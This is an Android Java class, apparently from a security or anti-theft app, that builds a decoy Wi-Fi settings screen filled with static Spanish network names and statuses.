package com.seguranca.protecao;

import android.widget.LinearLayout;

public class DecoyWifi extends DecoyScreen {
    protected String title() { return "WI-FI"; }

    protected void buildContent(LinearLayout body) {
        body.setPadding(dp(12), dp(12), dp(12), dp(12));
        body.addView(block("Wi-Fi", "Activado"));
        body.addView(block("Red actual", "Casa_2.4G"));
        body.addView(block("Redes disponibles", null));
        body.addView(block("Vecino_5G", "Conectada"));
        body.addView(block("Fibertel-8821", "Protegida"));
        body.addView(block("Movistar_Wifi", "Protegida"));
    }
}
